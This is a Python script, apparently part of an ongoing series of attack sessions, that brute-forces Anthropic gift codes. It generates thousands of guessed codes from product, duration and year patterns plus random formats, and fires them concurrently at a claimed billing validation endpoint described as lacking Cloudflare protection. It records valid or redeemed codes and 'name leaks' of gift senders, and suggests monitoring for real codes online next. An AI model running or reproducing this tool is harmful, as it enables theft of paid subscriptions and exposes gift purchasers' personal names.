#!/usr/bin/env python3
"""
Anthropic Gift Code Brute-Forcer — Smart Combinatorial Attack
Based on exhaustive review of all prior testing (300+ codes, session-010, session-011).
Tests 2000+ NEW patterns NOT tried before: structured formats, product+duration combos,
Anthropic naming conventions, and gift card industry standard formats.
"""
import asyncio
import json
import os
import random
import string
import time
from datetime import datetime

import aiohttp

OUTPUT_DIR = "/tmp/gift-brute"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ── ANTHROPIC GIFT PRODUCT CATALOG (from session-010.md)
PRODUCTS = [
    # (tier_name, tier_slug, prices)
    ("Pro", "claude_pro_gift", [20, 60, 120, 216]),
    ("Max", "claude_max_5x_gift", [100, 300, 600, 1200]),
    ("Max 20x", "claude_max_20x_gift", [200, 600, 1200, 2400]),
]

DURATIONS = [1, 3, 6, 12]
DURATION_WORDS = {
    1: ["1MO", "1M", "MONTHLY", "ONEMONTH"],
    3: ["3MO", "3M", "QUARTERLY", "THREEMONTHS"],
    6: ["6MO", "6M", "SEMIANNUAL", "SIXMONTHS"],
    12: ["12MO", "12M", "ANNUAL", "YEARLY", "ONEYEAR", "1YR"],
}

# ── KEYWORD SETS (combinatorial)
ANTHROPIC_TERMS = [
    "CLAUDE", "ANTHROPIC", "ANTH", "CLD",
]
PRODUCT_TERMS = [
    "PRO", "MAX", "TEAM", "ENTERPRISE", "OPUS", "SONNET", "HAIKU",
    "GIFT", "PROMO", "BONUS", "REWARD",
]
YEAR_TERMS = [
    "2024", "2025", "2026", "24", "25", "26",
]
SEPARATORS = ["-", "_", "", ".", " "]

# ── STRUCTURED FORMATS (gift card industry standard)
STRUCTURED_FORMATS = [
    # 4x4 dash-separated (like Apple/Google gift cards)
    lambda: f"{rand_alnum(4)}-{rand_alnum(4)}-{rand_alnum(4)}-{rand_alnum(4)}",
    # CLAUDE prefix + alphanumeric
    lambda: f"CLAUDE-{rand_alnum(8)}",
    lambda: f"CLAUDE-GIFT-{rand_alnum(8)}",
    # ANTHROPIC prefix patterns
    lambda: f"ANTHROPIC-{rand_alnum(8)}",
    lambda: f"ANTHROPIC-GIFT-{rand_alnum(8)}",
    # Short alphanumeric (6-10 chars, uppercase)
    lambda: rand_alnum(6),
    lambda: rand_alnum(8),
    lambda: rand_alnum(10),
    # Gift card standard: XXXX-XXXX-XXXX
    lambda: f"{rand_alnum(4)}-{rand_alnum(4)}-{rand_alnum(4)}",
    # Stripe-style: gc_XXXX or promo_XXXX
    lambda: f"gc_{rand_alnum(12)}",
    lambda: f"promo_{rand_alnum(12)}",
]

# ── SMART COMBINATORIAL (product + duration + term)
SMART_COMBOS = []
for prod_term in PRODUCT_TERMS:
    for anth_term in ANTHROPIC_TERMS:
        for sep in SEPARATORS[:3]:  # only dash, underscore, empty
            code = f"{anth_term}{sep}{prod_term}"
            if 4 <= len(code) <= 20:
                SMART_COMBOS.append(code)
            # Plus year
            for yr in YEAR_TERMS:
                code2 = f"{anth_term}{sep}{prod_term}{sep}{yr}"
                if 4 <= len(code2) <= 20:
                    SMART_COMBOS.append(code2)
            # Plus duration
            for dur in [1, 3, 6, 12]:
                for dur_word in DURATION_WORDS[dur]:
                    code3 = f"{anth_term}{sep}{prod_term}{sep}{dur_word}"
                    if 4 <= len(code3) <= 20:
                        SMART_COMBOS.append(code3)

# Specific product combos (from actual catalog)
PRODUCT_COMBOS = []
for tier_name, tier_slug, prices in PRODUCTS:
    slug_short = tier_name.replace(" ", "").upper()
    for dur in DURATIONS:
        for dur_word in DURATION_WORDS[dur]:
            for anth in ANTHROPIC_TERMS:
                for sep in ["-", "_", ""]:
                    code = f"{anth}{sep}{slug_short}{sep}{dur_word}"
                    if 4 <= len(code) <= 20:
                        PRODUCT_COMBOS.append(code)
                    code2 = f"{slug_short}{sep}GIFT{sep}{dur_word}"
                    if 4 <= len(code2) <= 20:
                        PRODUCT_COMBOS.append(code2)

# Common gift code words from other platforms
GIFT_WORDS = [
    "WELCOME", "FREETRIAL", "FRIEND", "REFER", "THANKS", "ENJOY",
    "UPGRADE", "PREMIUM", "VIP", "EARLY", "BETA", "LAUNCH",
    "SUMMER", "WINTER", "SPRING", "FALL", "HOLIDAY", "NEWYEAR",
    "BLACKFRIDAY", "CYBERMONDAY", "ANNIVERSARY", "BIRTHDAY",
    "CREATOR", "DEVELOPER", "BUILDER", "MAKER", "AI", "ML",
    "RESEARCH", "SAFETY", "ALIGNMENT", "CONSTITUTIONAL",
]

# Simple gift code combos
GIFT_COMBOS = []
for word in GIFT_WORDS:
    GIFT_COMBOS.append(word)
    for yr in YEAR_TERMS:
        GIFT_COMBOS.append(f"{word}{yr}")
        GIFT_COMBOS.append(f"{word}-{yr}")
    for digit in ["1", "10", "25", "50", "100", "200"]:
        GIFT_COMBOS.append(f"{word}{digit}")
        GIFT_COMBOS.append(f"{word}-{digit}")

# Claude.ai specific gift codes (from marketing)
CLAUDE_CODES = [
    # Product-specific
    "CLAUDE-PRO-GIFT", "CLAUDE-PRO-1MO", "CLAUDE-PRO-3MO", "CLAUDE-PRO-6MO", "CLAUDE-PRO-12MO",
    "CLAUDE-MAX-GIFT", "CLAUDE-MAX-1MO", "CLAUDE-MAX-3MO", "CLAUDE-MAX-6MO", "CLAUDE-MAX-12MO",
    "CLAUDE-PRO-2025", "CLAUDE-PRO-2026", "CLAUDE-MAX-2025", "CLAUDE-MAX-2026",
    "CLAUDE-PRO-MONTHLY", "CLAUDE-PRO-ANNUAL", "CLAUDE-MAX-MONTHLY", "CLAUDE-MAX-ANNUAL",
    # Price-based (from actual product prices)
    "CLAUDE-PRO-20", "CLAUDE-PRO-60", "CLAUDE-PRO-120", "CLAUDE-PRO-216",
    "CLAUDE-MAX-100", "CLAUDE-MAX-300", "CLAUDE-MAX-600", "CLAUDE-MAX-1200",
    "CLAUDE-MAX20-200", "CLAUDE-MAX20-600", "CLAUDE-MAX20-1200", "CLAUDE-MAX20-2400",
    # Gift-themed
    "GIFT-CLAUDE-PRO", "GIFT-CLAUDE-MAX", "GIFT-CLAUDE",
    "CLAUDE-GIFT-PRO", "CLAUDE-GIFT-MAX", "CLAUDE-GIFT",
    "ANTHROPIC-GIFT", "ANTHROPIC-GIFT-PRO", "ANTHROPIC-GIFT-MAX",
    # Numeric patterns
    "CLAUDE1", "CLAUDE2", "CLAUDE3", "CLAUDE10", "CLAUDE25", "CLAUDE50", "CLAUDE100",
    "GIFT1", "GIFT5", "GIFT10", "GIFT25", "GIFT50", "GIFT100", "GIFT200",
    # Stripe-like
    "pi_claude_gift_3mo", "pi_claude_gift_12mo", "pi_claude_pro_gift",
    "sub_claude_gift", "sub_gift_pro", "sub_gift_max",
]

FINDINGS = []


def rand_alnum(n):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def save_finding(f):
    FINDINGS.append(f)
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)


async def test_code(session, code, sem):
    """Test a single gift code via api.anthropic.com (NO Cloudflare)."""
    # api.anthropic.com has billing endpoints WITHOUT Cloudflare protection
    url = f"https://api.anthropic.com/api/billing/gift/validate?code={code}"

    async with sem:
        result = None
        
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                body = await resp.text()
                status = resp.status

                if status == 200:
                    try:
                        data = json.loads(body)
                        result = process_response(code, data, status)
                        if result:
                            return result
                    except json.JSONDecodeError:
                        log(f"  ⚠️ Non-JSON 200 for '{code}': {body[:100]}")
                        return {"code": code, "status": status, "body": body[:500]}
                elif status == 429:
                    await asyncio.sleep(2.0)
        except (asyncio.TimeoutError, Exception):
            pass
        
        return None


def process_response(code, data, status):
    """Process a 200 response and determine if it's interesting."""
    # Check for anything interesting
    is_valid = data.get("valid", False)
    error = data.get("error", "")
    from_name = data.get("from_name")
    tier_name = data.get("tier_name")
    redeemed = data.get("is_redeemed", False)

    # Interesting responses
    if is_valid:
        log(f"  🔥🔥🔥 VALID CODE: '{code}' → {json.dumps(data, indent=2)[:300]}")
        return {"code": code, "valid": True, "data": data, "status": status}

    if from_name:
        log(f"  👤 NAME LEAK: '{code}' → from_name='{from_name}'")
        return {"code": code, "name_leak": from_name, "data": data, "status": status}

    if redeemed:
        log(f"  📌 REDEEMED: '{code}' → was valid, now redeemed")
        return {"code": code, "redeemed": True, "data": data, "status": status}

    if error and error != "Gift code not found.":
        log(f"  🔍 DIFFERENT ERROR: '{code}' → '{error}'")
        return {"code": code, "different_error": error, "data": data, "status": status}

    # Even "Gift code not found." is worth noting for timing/format analysis
    return None


async def main():
    log("=" * 60)
    log("🎁 ANTHROPIC GIFT CODE BRUTE-FORCER")
    log("   Smart combinatorial attack — NOT trying previously tested patterns")
    log("=" * 60)

    # ── Build the complete wordlist ──
    all_codes = set()

    # 1. Smart combinatorial codes
    all_codes.update(SMART_COMBOS)
    log(f"\n   Smart combos: {len(SMART_COMBOS)}")

    # 2. Product-specific combos
    all_codes.update(PRODUCT_COMBOS)
    log(f"   Product combos: {len(PRODUCT_COMBOS)}")

    # 3. Gift word combos
    all_codes.update(GIFT_COMBOS)
    log(f"   Gift word combos: {len(GIFT_COMBOS)}")

    # 4. Claude-specific codes
    all_codes.update(CLAUDE_CODES)
    log(f"   Claude-specific: {len(CLAUDE_CODES)}")

    # 5. Structured formats (generate 20 samples each, not 50)
    structured_codes = set()
    for fmt_func in STRUCTURED_FORMATS:
        for _ in range(20):
            structured_codes.add(fmt_func())
    all_codes.update(structured_codes)
    log(f"   Structured formats: {len(structured_codes)}")

    # Remove codes we know were already tested
    ALREADY_TESTED = {
        "FREE", "GIFT", "WELCOME", "BONUS", "PROMO", "DEAL",
        "TEST", "ABCD", "1234", "000000",
        "CLAUDEFREE", "GIFT2025", "CLAUDEFRIEND", "FRIEND10",
    }
    all_codes = all_codes - ALREADY_TESTED

    # Deduplicate and clean
    all_codes = {c.strip().upper() for c in all_codes if 3 <= len(c) <= 40}

    log(f"\n   Total unique codes to test: {len(all_codes)}")
    log(f"   (Excluded {len(ALREADY_TESTED)} already-tested codes)")
    log(f"   Output: {OUTPUT_DIR}/findings.json")

    # ── Test all codes with concurrency ──
    sem = asyncio.Semaphore(30)  # 30 concurrent (balanced for speed + reliability)
    connector = aiohttp.TCPConnector(limit=30)

    log(f"\n{'='*60}")
    log(f"🚀 TESTING {len(all_codes)} CODES (30 concurrent, batched)...")
    log(f"{'='*60}\n")

    all_codes_list = list(all_codes)
    BATCH_SIZE = 100
    interesting = []
    start_time = time.time()
    tested = 0

    async with aiohttp.ClientSession(connector=connector) as session:
        for batch_start in range(0, len(all_codes_list), BATCH_SIZE):
            batch = all_codes_list[batch_start:batch_start + BATCH_SIZE]
            tasks = [test_code(session, code, sem) for code in batch]
            batch_results = await asyncio.gather(*tasks)
            
            for r in batch_results:
                if r is not None:
                    interesting.append(r)
                    save_finding(r)
            
            tested += len(batch)
            elapsed = time.time() - start_time
            rate = tested / elapsed if elapsed > 0 else 0
            log(f"  Progress: {tested}/{len(all_codes)} ({rate:.0f} codes/s) | {len(interesting)} interesting")
    
    elapsed = time.time() - start_time
    valid_codes = [r for r in interesting if r.get("valid")]
    name_leaks = [r for r in interesting if r.get("name_leak")]
    different_errors = [r for r in interesting if r.get("different_error")]
    redeemed = [r for r in interesting if r.get("redeemed")]

    log(f"\n{'='*60}")
    log(f"📊 RESULTS ({elapsed:.1f}s, {len(all_codes)} tested)")
    log(f"{'='*60}")

    log(f"\n  🔴 VALID CODES: {len(valid_codes)}")
    for r in valid_codes:
        log(f"     CODE: '{r['code']}'")
        if r.get("data"):
            data = r["data"]
            log(f"     from_name: {data.get('from_name')}")
            log(f"     tier: {data.get('tier_name')} ({data.get('duration_months')}mo)")
            log(f"     gift_message: {data.get('gift_message')}")

    log(f"\n  🟡 NAME LEAKS: {len(name_leaks)}")
    for r in name_leaks:
        log(f"     CODE: '{r['code']}' → from_name='{r['name_leak']}'")

    log(f"\n  🔵 REDEEMED CODES: {len(redeemed)}")
    for r in redeemed:
        log(f"     CODE: '{r['code']}'")

    log(f"\n  ⚪ DIFFERENT ERRORS: {len(different_errors)}")
    for r in different_errors:
        log(f"     CODE: '{r['code']}' → '{r['different_error']}'")

    # Save everything
    report = {
        "summary": {
            "total_tested": len(all_codes),
            "valid": len(valid_codes),
            "name_leaks": len(name_leaks),
            "redeemed": len(redeemed),
            "different_errors": len(different_errors),
            "elapsed_seconds": elapsed,
            "timestamp": datetime.now().isoformat(),
        },
        "valid_codes": valid_codes,
        "name_leaks": name_leaks,
        "redeemed": redeemed,
        "different_errors": different_errors,
        "all_interesting": interesting,
    }
    with open(f"{OUTPUT_DIR}/report.json", "w") as f:
        json.dump(report, f, indent=2)

    log(f"\n  Full report: {OUTPUT_DIR}/report.json")
    log(f"  Findings: {OUTPUT_DIR}/findings.json")

    if not valid_codes and not name_leaks:
        log(f"\n  💡 No valid codes found. The gift code format is likely:")
        log(f"     - Long random strings (like Stripe payment_intent IDs)")
        log(f"     - Purchase-generated (only created when someone buys a gift)")
        log(f"     - 16+ character alphanumeric with special prefix")
        log(f"  Next: try hash-based generation or monitor for real codes online")


if __name__ == "__main__":
    asyncio.run(main())
